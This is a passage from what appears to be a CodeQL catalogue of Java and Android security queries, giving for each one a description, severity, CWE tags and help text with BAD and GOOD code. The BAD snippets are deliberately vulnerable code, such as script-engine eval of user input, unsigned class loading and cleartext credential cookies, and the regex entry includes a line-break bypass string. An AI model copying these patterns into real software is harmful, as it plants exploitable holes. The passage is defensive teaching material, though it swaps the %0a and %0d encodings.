    "help": "# User-controlled data in numeric cast\nCasting a user-controlled numeric value to a narrower type can result in truncated values unless the input is validated.\n\nNarrowing conversions may cause potentially unintended results. For example, casting the positive integer value `128` to type `byte` yields the negative value `-128`.\n\n\n## Recommendation\nGuard against unexpected truncation of user-controlled arithmetic data by doing one of the following:\n\n* Validate the user input.\n* Define a guard on the cast expression, so that the cast is performed only if the input is known to be within the range of the resulting type.\n* Avoid casting to a narrower type, and instead continue to use a wider type.\n\n## Example\nIn this example, a value is read from standard input into a `long`. Because the value is a user-controlled value, it could be extremely large. Casting this value to a narrower type could therefore cause unexpected truncation. The `scaled2` example uses a guard to avoid this problem and checks the range of the input before performing the cast. If the value is too large to cast to type `int` it is rejected as invalid.\n\n\n```java\nclass Test {\n\tpublic static void main(String[] args) throws IOException {\n\t\t{\n\t\t\tlong data;\n\n\t\t\tBufferedReader readerBuffered = new BufferedReader(\n\t\t\t\t\tnew InputStreamReader(System.in, \"UTF-8\"));\n\t\t\tString stringNumber = readerBuffered.readLine();\n\t\t\tif (stringNumber != null) {\n\t\t\t\tdata = Long.parseLong(stringNumber.trim());\n\t\t\t} else {\n\t\t\t\tdata = 0;\n\t\t\t}\n\n\t\t\t// AVOID: potential truncation if input data is very large,\n\t\t\t// for example 'Long.MAX_VALUE'\n\t\t\tint scaled = (int)data;\n\n\t\t\t//...\n\n\t\t\t// GOOD: use a guard to ensure no truncation occurs\n\t\t\tint scaled2;\n\t\t\tif (data > Integer.MIN_VALUE && data < Integer.MAX_VALUE)\n\t\t\t\tscaled2 = (int)data;\n\t\t\telse\n\t\t\t\tthrow new IllegalArgumentException(\"Invalid input\");\n\t\t}\n\t}\n}\n```\n\n## References\n* SEI CERT Oracle Coding Standard for Java: [NUM12-J. Ensure conversions of numeric types to narrower types do not result in lost or misinterpreted data](https://wiki.sei.cmu.edu/confluence/display/java/NUM12-J.+Ensure+conversions+of+numeric+types+to+narrower+types+do+not+result+in+lost+or+misinterpreted+data).\n* Common Weakness Enumeration: [CWE-197](https://cwe.mitre.org/data/definitions/197.html).\n* Common Weakness Enumeration: [CWE-681](https://cwe.mitre.org/data/definitions/681.html).\n"
  },
  "java/count-untrusted-data-external-api": {
    "name": "Frequency counts for external APIs that are used with untrusted data",
    "description": "This reports the external APIs that are used with untrusted data, along with how frequently the API is called, and how many unique sources of untrusted data flow to it.",
    "id": "java/count-untrusted-data-external-api",
    "kind": "table",
    "tags": [
      "security external/cwe/cwe-20"
    ],
    "filename": "462a50c1-ExternalAPIsUsedWithUntrustedData",
    "language": "java",
    "help": "# Frequency counts for external APIs that are used with untrusted data\nUsing unsanitized untrusted data in an external API can cause a variety of security issues. This query reports all external APIs that are used with untrusted data, along with how frequently the API is used, and how many unique sources of untrusted data flow to this API. This query is designed primarily to help identify which APIs may be relevant for security analysis of this application.\n\nAn external API is defined as a method call to a method that is not defined in the source code, not overridden in the source code, and is not modeled as a taint step in the default taint library. External APIs may be from the Java standard library, third party dependencies or from internal dependencies. The query will report the method signature with a fully qualified name, along with either `[param x]`, where `x` indicates the position of the parameter receiving the untrusted data or `[qualifier]` indicating the untrusted data is used as the qualifier to the method call.\n\n\n## Recommendation\nFor each result:\n\n* If the result highlights a known sink, no action is required.\n* If the result highlights an unknown sink for a problem, then add modeling for the sink to the relevant query.\n* If the result represents a call to an external API which transfers taint, add the appropriate modeling, and re-run the query to determine what new results have appeared due to this additional modeling.\nOtherwise, the result is likely uninteresting. Custom versions of this query can extend the `SafeExternalAPIMethod` class to exclude known safe external APIs from future analysis.\n\n\n## Example\nIf the query were to return the API `javax.servlet.http.HttpServletResponse.sendError(int, java.lang.String) [param 1]` then we should first consider whether this a security relevant sink. In this case, this is writing to a HTTP response, so we should consider whether this is an XSS sink. If it is, we should confirm that it is handled by the XSS query.\n\nIf the query were to return the API `java.lang.StringBuilder.append(java.lang.String) [param 0]`, then this should be reviewed as a possible taint step, because tainted data would flow from the 0th argument to the qualifier of the call.\n\nNote that both examples are correctly handled by the standard taint tracking library and XSS query.\n\n\n## References\n* Common Weakness Enumeration: [CWE-20](https://cwe.mitre.org/data/definitions/20.html).\n"
  },
  "java/static-initialization-vector": {
    "name": "Using a static initialization vector for encryption",
    "description": "An initialization vector (IV) used for ciphers of certain modes (such as CBC or GCM) should be unique and unpredictable, to maximize encryption and prevent dictionary attacks.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "high",
    "id": "java/static-initialization-vector",
    "tags": [
      "security",
      "external/cwe/cwe-329",
      "external/cwe/cwe-1204"
    ],
    "filename": "776d3609-StaticInitializationVector",
    "language": "java",
    "help": "# Using a static initialization vector for encryption\nWhen a cipher is used in certain modes such as CBC or GCM, it requires an initialization vector (IV). Under the same secret key, IVs should be unique and ideally unpredictable. If the same IV is used with the same secret key, then the same plaintext results in the same ciphertext. This can let an attacker learn if the same data pieces are transferred or stored, or help the attacker run a dictionary attack.\n\n\n## Recommendation\nUse a random IV generated by `SecureRandom`.\n\n\n## Example\nThe following example initializes a cipher with a static IV, which is unsafe:\n\n\n```java\nbyte[] iv = new byte[16]; // all zeroes\nGCMParameterSpec params = new GCMParameterSpec(128, iv);\nCipher cipher = Cipher.getInstance(\"AES/GCM/PKCS5PADDING\");\ncipher.init(Cipher.ENCRYPT_MODE, key, params);\n```\nThe next example initializes a cipher with a random IV:\n\n\n```java\nbyte[] iv = new byte[16];\nSecureRandom random = SecureRandom.getInstanceStrong();\nrandom.nextBytes(iv);\nGCMParameterSpec params = new GCMParameterSpec(128, iv);\nCipher cipher = Cipher.getInstance(\"AES/GCM/PKCS5PADDING\");\ncipher.init(Cipher.ENCRYPT_MODE, key, params);\n```\n\n## References\n* Wikipedia: [Initialization vector](https://en.wikipedia.org/wiki/Initialization_vector).\n* National Institute of Standards and Technology: [Recommendation for Block Cipher Modes of Operation](https://nvlpubs.nist.gov/nistpubs/Legacy/SP/nistspecialpublication800-38a.pdf).\n* National Institute of Standards and Technology: [FIPS 140-2: Security Requirements for Cryptographic Modules](https://nvlpubs.nist.gov/nistpubs/FIPS/NIST.FIPS.140-2.pdf).\n* Common Weakness Enumeration: [CWE-329](https://cwe.mitre.org/data/definitions/329.html).\n* Common Weakness Enumeration: [CWE-1204](https://cwe.mitre.org/data/definitions/1204.html).\n"
  },
  "java/android/unsafe-reflection": {
    "name": "Load 3rd party classes or code ('unsafe reflection') without signature check",
    "description": "Loading classes or code from third-party packages without checking the package signature could make the application susceptible to package namespace squatting attacks, potentially leading to arbitrary code execution.",
    "problem.severity": "error",
    "precision": "high",
    "kind": "path-problem",
    "id": "java/android/unsafe-reflection",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-470"
    ],
    "filename": "ab597e1d-LoadClassNoSignatureCheck",
    "language": "java",
    "help": "# Load 3rd party classes or code ('unsafe reflection') without signature check\nIf an application loads classes or code from another app based solely on its package name without first checking its package signature, this could allow a malicious app with the same package name to be loaded through \"package namespace squatting\". If the victim user install such malicious app in the same device as the vulnerable app, the vulnerable app would load classes or code from the malicious app, potentially leading to arbitrary code execution.\n\n\n## Recommendation\nVerify the package signature in addition to the package name before loading any classes or code from another application.\n\n\n## Example\nThe `BadClassLoader` class illustrates class loading with the `android.content.pm.PackageInfo.packageName.startsWith()` method without any check on the package signature.\n\n\n```java\npackage poc.sample.classloader;\n\nimport android.app.Application;\nimport android.content.pm.PackageInfo;\nimport android.content.Context;\nimport android.util.Log;\n\npublic class BadClassLoader extends Application {\n    @Override\n    public void onCreate() {\n        super.onCreate();\n        for (PackageInfo p : getPackageManager().getInstalledPackages(0)) {\n            try {\n                if (p.packageName.startsWith(\"some.package.\")) {\n                    Context appContext = createPackageContext(p.packageName,\n                            CONTEXT_INCLUDE_CODE | CONTEXT_IGNORE_SECURITY);\n                    ClassLoader classLoader = appContext.getClassLoader();\n                    Object result = classLoader.loadClass(\"some.package.SomeClass\")\n                            .getMethod(\"someMethod\")\n                            .invoke(null);\n                }\n            } catch (Exception e) {\n                Log.e(\"Class loading failed\", e.toString());\n            }\n        }\n    }\n}\n\n```\nThe `GoodClassLoader` class illustrates class loading with correct package signature check using the `android.content.pm.PackageManager.checkSignatures()` method.\n\n\n```java\npackage poc.sample.classloader;\n\nimport android.app.Application;\nimport android.content.pm.PackageInfo;\nimport android.content.Context;\nimport android.content.pm.PackageManager;\nimport android.util.Log;\n\npublic class GoodClassLoader extends Application {\n    @Override\n    public void onCreate() {\n        super.onCreate();\n        PackageManager pm = getPackageManager();\n        for (PackageInfo p : pm.getInstalledPackages(0)) {\n            try {\n                if (p.packageName.startsWith(\"some.package.\") &&\n                        (pm.checkSignatures(p.packageName, getApplicationContext().getPackageName()) == PackageManager.SIGNATURE_MATCH)\n                ) {\n                    Context appContext = createPackageContext(p.packageName,\n                            CONTEXT_INCLUDE_CODE | CONTEXT_IGNORE_SECURITY);\n                    ClassLoader classLoader = appContext.getClassLoader();\n                    Object result = classLoader.loadClass(\"some.package.SomeClass\")\n                            .getMethod(\"someMethod\")\n                            .invoke(null);\n                }\n            } catch (Exception e) {\n                Log.e(\"Class loading failed\", e.toString());\n            }\n        }\n    }\n}\n\n```\n\n## References\n* [ Oversecured (Android: arbitrary code execution via third-party package contexts) ](https://blog.oversecured.com/Android-arbitrary-code-execution-via-third-party-package-contexts/)\n* Common Weakness Enumeration: [CWE-470](https://cwe.mitre.org/data/definitions/470.html).\n"
  },
  "java/android/sensitive-notification": {
    "name": "Exposure of sensitive information to notifications",
    "id": "java/android/sensitive-notification",
    "kind": "path-problem",
    "description": "Sensitive information exposed in a system notification can be read by an unauthorized application.",
    "problem.severity": "error",
    "precision": "medium",
    "security-severity": 6.5,
    "tags": [
      "security",
      "external/cwe/cwe-200"
    ],
    "filename": "c79ca7dc-AndroidSensitiveNotifications",
    "language": "java",
    "help": "# Exposure of sensitive information to notifications\nSensitive information such as passwords or two-factor authentication (2FA) codes should not be exposed in a system notification. Notifications should not be considered secure, as other untrusted applications may be able to use a `NotificationListenerService` to read the contents of notifications.\n\n\n## Recommendation\nDo not expose sensitive data in notifications.\n\n\n## Example\nIn the following sample, the `password` is sent as part of a notification. This can allow another application to read this password.\n\n\n```java\n// BAD: `password` is exposed in a notification.\nvoid confirmPassword(String password) {\n    NotificationManager manager = NotificationManager.from(this);\n    manager.send(\n        new Notification.Builder(this, CHANNEL_ID)\n        .setContentText(\"Your password is: \" + password)\n        .build());\n}\n```\n\n## References\n* OWASP Mobile Application Security: [Android Data Storage - Application Notifications](https://mas.owasp.org/MASTG/Android/0x05d-Testing-Data-Storage/#app-notifications)\n* Common Weakness Enumeration: [CWE-200](https://cwe.mitre.org/data/definitions/200.html).\n"
  },
  "java/comparison-with-wider-type": {
    "name": "Comparison of narrow type with wide type in loop condition",
    "description": "Comparisons between types of different widths in a loop condition can cause the loop to behave unexpectedly.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 8.1,
    "precision": "medium",
    "id": "java/comparison-with-wider-type",
    "tags": [
      "reliability",
      "security",
      "external/cwe/cwe-190",
      "external/cwe/cwe-197"
    ],
    "filename": "47e93059-ComparisonWithWiderType",
    "language": "java",
    "help": "# Comparison of narrow type with wide type in loop condition\nIn a loop condition, comparison of a value of a narrow type with a value of a wide type may always evaluate to `true` if the wider value is sufficiently large (or small). This is because the narrower value may overflow. This can lead to an infinite loop.\n\n\n## Recommendation\nChange the types of the compared values so that the value on the narrower side of the comparison is at least as wide as the value it is being compared with.\n\n\n## Example\nIn this example, `bytesReceived` is compared against `MAXGET` in a `while` loop. However, `bytesReceived` is a `short`, and `MAXGET` is a `long`. Because `MAXGET` is larger than `Short.MAX_VALUE`, the loop condition is always `true`, so the loop never terminates.\n\nThis problem is avoided in the 'GOOD' case because `bytesReceived2` is a `long`, which is as wide as the type of `MAXGET`.\n\n\n```java\nclass Test {\n\tpublic static void main(String[] args) {\n\t\t\n\t\t{\t\t\n\t\t\tint BIGNUM = Integer.MAX_VALUE;\n\t\t\tlong MAXGET = Short.MAX_VALUE + 1;\n\t\t\t\n\t\t\tchar[] buf = new char[BIGNUM];\n\n\t\t\tshort bytesReceived = 0;\n\t\t\t\n\t\t\t// BAD: 'bytesReceived' is compared with a value of wider type.\n\t\t\t// 'bytesReceived' overflows before reaching MAXGET,\n\t\t\t// causing an infinite loop.\n\t\t\twhile (bytesReceived < MAXGET) {\n\t\t\t\tbytesReceived += getFromInput(buf, bytesReceived);\n\t\t\t}\n\t\t}\n\t\t\n\t\t{\n\t\t\tlong bytesReceived2 = 0;\n\t\t\t\n\t\t\t// GOOD: 'bytesReceived2' has a type at least as wide as MAXGET.\n\t\t\twhile (bytesReceived2 < MAXGET) {\n\t\t\t\tbytesReceived2 += getFromInput(buf, bytesReceived2);\n\t\t\t}\n\t\t}\n\t\t\n\t}\n\t\n\tpublic static int getFromInput(char[] buf, short pos) {\n\t\t// write to buf\n\t\t// ...\n\t\treturn 1;\n\t}\n}\n```\n\n## References\n* SEI CERT Oracle Coding Standard for Java: [NUM00-J. Detect or prevent integer overflow](https://wiki.sei.cmu.edu/confluence/display/java/NUM00-J.+Detect+or+prevent+integer+overflow).\n* Common Weakness Enumeration: [CWE-190](https://cwe.mitre.org/data/definitions/190.html).\n* Common Weakness Enumeration: [CWE-197](https://cwe.mitre.org/data/definitions/197.html).\n"
  },
  "java/android/websettings-file-access": {
    "name": "Android WebSettings file access",
    "kind": "problem",
    "description": "Enabling access to the file system in a WebView allows attackers to view sensitive information.",
    "id": "java/android/websettings-file-access",
    "problem.severity": "warning",
    "security-severity": 6.5,
    "precision": "medium",
    "tags": [
      "security",
      "external/cwe/cwe-200"
    ],
    "filename": "c79ca7dc-AndroidWebViewSettingsFileAccess",
    "language": "java",
    "help": "# Android WebSettings file access\nAllowing file access in an Android WebView can expose a device's file system to the JavaScript running in that WebView. If the JavaScript contains vulnerabilities or the WebView loads untrusted content, file access allows an attacker to steal the user's data.\n\n\n## Recommendation\nWhen possible, do not allow file access. The file access settings are disabled by default. You can explicitly disable file access by setting the following settings to `false`:\n\n* `setAllowFileAccess`\n* `setAllowFileAccessFromFileURLs`\n* `setAllowUniversalAccessFromFileURLs`\nIf your application requires access to the file system, it is best to avoid using `file://` URLs. Instead, use an alternative that loads files via HTTPS, such as `androidx.webkit.WebViewAssetLoader`.\n\n\n## Example\nIn the following (bad) example, the WebView is configured with settings that allow local file access.\n\n\n```java\nWebSettings settings = view.getSettings();\n\nsettings.setAllowFileAccess(true);\nsettings.setAllowFileAccessFromURLs(true);\nsettings.setAllowUniversalAccessFromURLs(true);\n\n```\nIn the following (good) example, the WebView is configured to disallow file access.\n\n\n```java\nWebSettings settings = view.getSettings();\n\nsettings.setAllowFileAccess(false);\nsettings.setAllowFileAccessFromURLs(false);\nsettings.setAllowUniversalAccessFromURLs(false);\n\n```\nAs mentioned previously, asset loaders can load files without file system access. In the following (good) example, an asset loader is configured to load assets over HTTPS.\n\n\n```java\nWebViewAssetLoader loader = new WebViewAssetLoader.Builder()\n    // Replace the domain with a domain you control, or use the default\n    // appassets.androidplatform.com\n    .setDomain(\"appassets.example.com\")\n    .addPathHandler(\"/resources\", new AssetsPathHandler(this))\n    .build();\n\nwebView.setWebViewClient(new WebViewClientCompat() {\n    @Override\n    public WebResourceResponse shouldInterceptRequest(WebView view, WebResourceRequest request) {\n        return assetLoader.shouldInterceptRequest(request.getUrl());\n    }\n});\n\nwebView.loadUrl(\"https://appassets.example.com/resources/www/index.html\");\n\n```\n\n## References\n* Android documentation: [WebSettings.setAllowFileAccess](https://developer.android.com/reference/android/webkit/WebSettings#setAllowFileAccess(boolean)).\n* Android documentation: [WebSettings.setAllowFileAccessFromFileURLs](https://developer.android.com/reference/android/webkit/WebSettings#setAllowFileAccessFromFileURLs(boolean)).\n* Android documentation: [WebSettings.setAllowUniversalAccessFromFileURLs](https://developer.android.com/reference/android/webkit/WebSettings#setAllowUniversalAccessFromFileURLs(boolean)).\n* Android documentation: [WebViewAssetLoader](https://developer.android.com/reference/androidx/webkit/WebViewAssetLoader).\n* Common Weakness Enumeration: [CWE-200](https://cwe.mitre.org/data/definitions/200.html).\n"
  },
  "java/cleartext-storage-in-properties": {
    "name": "Cleartext storage of sensitive information using 'Properties' class",
    "description": "Storing sensitive information in cleartext can expose it to an attacker.",
    "kind": "problem",
    "problem.severity": "warning",
    "security-severity": 7.5,
    "precision": "medium",
    "id": "java/cleartext-storage-in-properties",
    "tags": [
      "security",
      "external/cwe/cwe-313"
    ],
    "filename": "c3bb55c3-CleartextStorageProperties",
    "language": "java",
    "help": "# Cleartext storage of sensitive information using 'Properties' class\nSensitive information that is stored unencrypted is accessible to an attacker who gains access to the storage.\n\n\n## Recommendation\nEnsure that sensitive information is always encrypted before being stored. It may be wise to encrypt information before it is put into a heap data structure (such as `Java.util.Properties`) that may be written to disk later. Objects that are serializable or marshallable should also always contain encrypted information unless you are certain that they are not ever going to be serialized.\n\nIn general, decrypt sensitive information only at the point where it is necessary for it to be used in cleartext.\n\n\n## Example\nThe following example shows two ways of storing user credentials in a cookie. In the 'BAD' case, the credentials are simply stored in cleartext. In the 'GOOD' case, the credentials are hashed before storing them.\n\n\n```java\npublic static void main(String[] args) {\n\t{\n\t\tString data;\n\t\tPasswordAuthentication credentials =\n\t\t\t\tnew PasswordAuthentication(\"user\", \"BP@ssw0rd\".toCharArray());\n\t\tdata = credentials.getUserName() + \":\" + new String(credentials.getPassword());\n\t\n\t\t// BAD: store data in a cookie in cleartext form\n\t\tresponse.addCookie(new Cookie(\"auth\", data));\n\t}\n\t\n\t{\n\t\tString data;\n\t\tPasswordAuthentication credentials =\n\t\t\t\tnew PasswordAuthentication(\"user\", \"GP@ssw0rd\".toCharArray());\n\t\tString salt = \"ThisIsMySalt\";\n\t\tMessageDigest messageDigest = MessageDigest.getInstance(\"SHA-512\");\n\t\tmessageDigest.reset();\n\t\tString credentialsToHash =\n\t\t\t\tcredentials.getUserName() + \":\" + credentials.getPassword();\n\t\tbyte[] hashedCredsAsBytes =\n\t\t\t\tmessageDigest.digest((salt+credentialsToHash).getBytes(\"UTF-8\"));\n\t\tdata = bytesToString(hashedCredsAsBytes);\n\t\t\n\t\t// GOOD: store data in a cookie in encrypted form\n\t\tresponse.addCookie(new Cookie(\"auth\", data));\n\t}\n}\n\n```\n\n## References\n* SEI CERT Oracle Coding Standard for Java: [SER03-J. Do not serialize unencrypted, sensitive data](https://wiki.sei.cmu.edu/confluence/display/java/SER03-J.+Do+not+serialize+unencrypted+sensitive+data).\n* M. Dowd, J. McDonald and J. Schuhm, *The Art of Software Security Assessment*, 1st Edition, Chapter 2 - 'Common Vulnerabilities of Encryption', p. 43. Addison Wesley, 2006.\n* M. Howard and D. LeBlanc, *Writing Secure Code*, 2nd Edition, Chapter 9 - 'Protecting Secret Data', p. 299. Microsoft, 2002.\n* Common Weakness Enumeration: [CWE-313](https://cwe.mitre.org/data/definitions/313.html).\n"
  },
  "java/regex-injection": {
    "name": "Regular expression injection",
    "description": "User input should not be used in regular expressions without first being escaped, otherwise a malicious user may be able to provide a regex that could require exponential time on certain inputs.",
    "kind": "path-problem",
    "problem.severity": "error",
    "security-severity": 7.5,
    "precision": "high",
    "id": "java/regex-injection",
    "tags": [
      "security",
      "external/cwe/cwe-730",
      "external/cwe/cwe-400"
    ],
    "filename": "3a0d1a85-RegexInjection",
    "language": "java",
    "help": "# Regular expression injection\nConstructing a regular expression with unsanitized user input is dangerous as a malicious user may be able to modify the meaning of the expression. In particular, such a user may be able to provide a regular expression fragment that takes exponential time in the worst case, and use that to perform a Denial of Service attack.\n\n\n## Recommendation\nBefore embedding user input into a regular expression, use a sanitization function such as `Pattern.quote` to escape meta-characters that have special meaning.\n\n\n## Example\nThe following example shows an HTTP request parameter that is used to construct a regular expression.\n\nIn the first case the user-provided regex is not escaped. If a malicious user provides a regex whose worst-case performance is exponential, then this could lead to a Denial of Service.\n\nIn the second case, the user input is escaped using `Pattern.quote` before being included in the regular expression. This ensures that the user cannot insert characters which have a special meaning in regular expressions.\n\n\n```java\nimport java.util.regex.Pattern;\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.http.HttpServletRequest;\n\npublic class RegexInjectionDemo extends HttpServlet {\n\n  public boolean badExample(javax.servlet.http.HttpServletRequest request) {\n    String regex = request.getParameter(\"regex\");\n    String input = request.getParameter(\"input\");\n\n    // BAD: Unsanitized user input is used to construct a regular expression\n    return input.matches(regex);\n  }\n\n  public boolean goodExample(javax.servlet.http.HttpServletRequest request) {\n    String regex = request.getParameter(\"regex\");\n    String input = request.getParameter(\"input\");\n\n    // GOOD: User input is sanitized before constructing the regex\n    return input.matches(Pattern.quote(regex));\n  }\n}\n\n```\n\n## References\n* OWASP: [Regular expression Denial of Service - ReDoS](https://www.owasp.org/index.php/Regular_expression_Denial_of_Service_-_ReDoS).\n* Wikipedia: [ReDoS](https://en.wikipedia.org/wiki/ReDoS).\n* Java API Specification: [Pattern.quote](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/util/regex/Pattern.html#quote(java.lang.String)).\n* Common Weakness Enumeration: [CWE-730](https://cwe.mitre.org/data/definitions/730.html).\n* Common Weakness Enumeration: [CWE-400](https://cwe.mitre.org/data/definitions/400.html).\n"
  },
  "java/openstream-called-on-tainted-url": {
    "name": "openStream called on URLs created from remote source",
    "description": "Calling openStream on URLs created from remote source can lead to local file disclosure.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "precision": "medium",
    "id": "java/openstream-called-on-tainted-url",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-036"
    ],
    "filename": "edd98374-OpenStream",
    "language": "java",
    "help": "# openStream called on URLs created from remote source\nCalling `openStream` on URLs created from remote source can lead to local file disclosure.\n\nIf `openStream` is called on a `java.net.URL`, that was created from a remote source, an attacker can try to pass absolute URLs starting with `file://` or `jar://` to access local resources in addition to remote ones.\n\n\n## Recommendation\nWhen you construct a URL using `java.net.URL` from a remote source, don't call `openStream` on it. Instead, use an HTTP Client to fetch the URL and access its content. You should also validate the URL to check that it uses the correct protocol and host combination.\n\n\n## Example\nThe following example shows an URL that is constructed from a request parameter. Afterwards `openStream` is called on the URL, potentially leading to a local file access.\n\n\n```java\npublic class TestServlet extends HttpServlet {\n    protected void doGet(HttpServletRequest request, HttpServletResponse response)\n    throws ServletException, IOException {\n        // BAD: a URL from a remote source is opened with URL#openStream()\n        URL url = new URL(request.getParameter(\"url\"));\n        InputStream inputStream = new URL(url).openStream();\n    }\n}\n\n```\n\n## References\n* Java API Specification: [ Class URL](https://docs.oracle.com/en/java/javase/11/docs/api/java.base/java/net/URL.html).\n* Common Weakness Enumeration: [CWE-36](https://cwe.mitre.org/data/definitions/36.html).\n"
  },
  "java/unsafe-eval": {
    "name": "Injection in Java Script Engine",
    "description": "Evaluation of user-controlled data using the Java Script Engine may lead to remote code execution.",
    "kind": "path-problem",
    "problem.severity": "error",
    "precision": "high",
    "id": "java/unsafe-eval",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-094"
    ],
    "filename": "dad3fd69-ScriptInjection",
    "language": "java",
    "help": "# Injection in Java Script Engine\nThe Java Scripting API has been available since the release of Java 6. It allows applications to interact with scripts written in languages such as JavaScript. It serves as an embedded scripting engine inside Java applications which allows Java-to-JavaScript interoperability and provides a seamless integration between the two languages. If an expression is built using attacker-controlled data, and then evaluated in a powerful context, it may allow the attacker to run arbitrary code.\n\n\n## Recommendation\nIn general, including user input in a Java Script Engine expression should be avoided. If user input must be included in the expression, it should be then evaluated in a safe context that doesn't allow arbitrary code invocation. Use \"Cloudbees Rhino Sandbox\" or sandboxing with SecurityManager, which will be deprecated in a future release, or use [GraalVM](https://www.graalvm.org/) instead.\n\n\n## Example\nThe following code could execute user-supplied JavaScript code in `ScriptEngine`\n\n\n```java\n// Bad: ScriptEngine allows arbitrary code injection\nScriptEngineManager scriptEngineManager = new ScriptEngineManager();\nScriptEngine scriptEngine = scriptEngineManager.getEngineByExtension(\"js\");\nObject result = scriptEngine.eval(code);\n```\n\n```java\n// Bad: Execute externally controlled input in Nashorn Script Engine\nNashornScriptEngineFactory factory = new NashornScriptEngineFactory();\nNashornScriptEngine engine = (NashornScriptEngine) factory.getScriptEngine(new String[] { \"-scripting\"});\nObject result = engine.eval(input);\n\n```\nThe following example shows two ways of using Rhino expression. In the 'BAD' case, an unsafe context is initialized with `initStandardObjects` that allows arbitrary Java code to be executed. In the 'GOOD' case, a safe context is initialized with `initSafeStandardObjects` or `setClassShutter`.\n\n\n```java\nimport org.mozilla.javascript.ClassShutter;\nimport org.mozilla.javascript.Context;\nimport org.mozilla.javascript.Scriptable;\n\npublic class RhinoInjection extends HttpServlet {\n\n  protected void doGet(HttpServletRequest request, HttpServletResponse response) throws ServletException, IOException {\n    response.setContentType(\"text/plain\");\n    String code = request.getParameter(\"code\");\n    Context ctx = Context.enter();\n    try {\n      {\n        // BAD: allow arbitrary Java and JavaScript code to be executed\n        Scriptable scope = ctx.initStandardObjects();\n      }\n\n      {\n        // GOOD: enable the safe mode\n        Scriptable scope = ctx.initSafeStandardObjects();\n      }\n\n      {\n        // GOOD: enforce a constraint on allowed classes\n        Scriptable scope = ctx.initStandardObjects();\n        ctx.setClassShutter(new ClassShutter() {\n            public boolean visibleToScripts(String className) {\n              return className.startsWith(\"com.example.\");\n            }\n        });\n      }\n\n      Object result = ctx.evaluateString(scope, code, \"<code>\", 1, null);\n      response.getWriter().print(Context.toString(result));\n    } catch(RhinoException ex) {\n      response.getWriter().println(ex.getMessage());\n    } finally {\n      Context.exit();\n    }\n  }\n}\n\n```\n\n## References\n* CERT coding standard: [ScriptEngine code injection](https://wiki.sei.cmu.edu/confluence/display/java/IDS52-J.+Prevent+code+injection)\n* GraalVM: [Secure by Default](https://www.graalvm.org/reference-manual/js/NashornMigrationGuide/#secure-by-default)\n* Mozilla Rhino: [Rhino: JavaScript in Java](https://github.com/mozilla/rhino)\n* Rhino Sandbox: [A sandbox to execute JavaScript code with Rhino in Java](https://github.com/javadelight/delight-rhino-sandbox)\n* GuardRails: [Code Injection](https://docs.guardrails.io/docs/en/vulnerabilities/java/insecure_use_of_dangerous_function#code-injection)\n* Common Weakness Enumeration: [CWE-94](https://cwe.mitre.org/data/definitions/94.html).\n"
  },
  "java/android/webview-debugging-enabled": {
    "name": "Android Webview debugging enabled",
    "description": "Enabling Webview debugging in production builds can expose entry points or leak sensitive information.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "security-severity": 7.2,
    "id": "java/android/webview-debugging-enabled",
    "tags": [
      "security",
      "external/cwe/cwe-489"
    ],
    "precision": "high",
    "filename": "78003e54-WebviewDebuggingEnabled",
    "language": "java",
    "help": "# Android Webview debugging enabled\nThe `WebView.setWebContentsDebuggingEnabled` method enables or disables the contents of any `WebView` in the application to be debugged.\n\nYou should only enable debugging features during development. When you create a production build, you should disable it. If you enable debugging features, this can make your code vulnerable by adding entry points, or leaking sensitive information.\n\n\n## Recommendation\nEnsure that debugging features are not enabled in production builds, such as by guarding calls to `WebView.setWebContentsDebuggingEnabled(true)` by a flag that is only enabled in debug builds.\n\n\n## Example\nIn the first (bad) example, WebView debugging is always enabled. whereas the GOOD case only enables it if the `android:debuggable` attribute is set to `true`.\n\n\n```java\n// BAD - debugging is always enabled \nWebView.setWebContentsDebuggingEnabled(true);\n\n// GOOD - debugging is only enabled when this is a debug build, as indicated by the debuggable flag being set.\nif (0 != (getApplicationInfo().flags & ApplicationInfo.FLAG_DEBUGGABLE)) {\n    WebView.setWebContentsDebuggingEnabled(true);\n}\n```\n\n## References\n* Android Developers: [setWebContentsDebuggingEnabled](https://developer.android.com/reference/android/webkit/WebView.html#setWebContentsDebuggingEnabled(boolean)).\n* Android Developers: [Remote debugging WebViews](https://developer.chrome.com/docs/devtools/remote-debugging/webviews/).\n* Common Weakness Enumeration: [CWE-489](https://cwe.mitre.org/data/definitions/489.html).\n"
  },
  "java/permissive-dot-regex": {
    "name": "URL matched by permissive `.` in a regular expression",
    "description": "URLs validated with a permissive `.` in regular expressions may be vulnerable to an authorization bypass.",
    "kind": "path-problem",
    "problem.severity": "warning",
    "precision": "high",
    "id": "java/permissive-dot-regex",
    "tags": [
      "security",
      "experimental",
      "external/cwe/cwe-625",
      "external/cwe/cwe-863"
    ],
    "filename": "36a09ce7-PermissiveDotRegex",
    "language": "java",
    "help": "# URL matched by permissive `.` in a regular expression\nBy default, a \"dot\" (`.`) in a regular expression matches all characters except the newline characters `\\n` and `\\r`. Regular expressions containing a dot can be bypassed with the characters `\\r`(`%0a`) and `\\n`(`%0d`) when the default Java regular expression matching implementations are used. This becomes a security issue if these regular expressions are used to decide whether to grant access to protected application resources.\n\n\n## Recommendation\nTo guard against unauthorized access, it is advisable to properly specify regex patterns for validating user input. The Java Pattern Matcher API `Pattern.compile(PATTERN, Pattern.DOTALL)` with the `DOTALL` flag set can be adopted to address this vulnerability.\n\n\n## Example\nThe following snippets show a vulnerable example and a secure example respectively. The `bad` methods show a regex pattern allowing a bypass by using line break characters. In the `good` methods, it is shown how to solve this problem by either specifying the regex pattern correctly or using a Java API that properly matches new line characters.\n\n\n```java\nString PROTECTED_PATTERN = \"/protected/.*\";\nString CONSTRAINT_PATTERN = \"/protected/xyz\\\\.xml\";\n\n// BAD: A string with line return e.g. `/protected/%0dxyz` can bypass the path check\nPattern p = Pattern.compile(PROTECTED_PATTERN);\nMatcher m = p.matcher(path);\n\n// GOOD: A string with line return e.g. `/protected/%0dxyz` cannot bypass the path check\nPattern p = Pattern.compile(PROTECTED_PATTERN, Pattern.DOTALL);\nMatcher m = p.matcher(path);\n\n// GOOD: Only a specific path can pass the validation\nPattern p = Pattern.compile(CONSTRAINT_PATTERN);\nMatcher 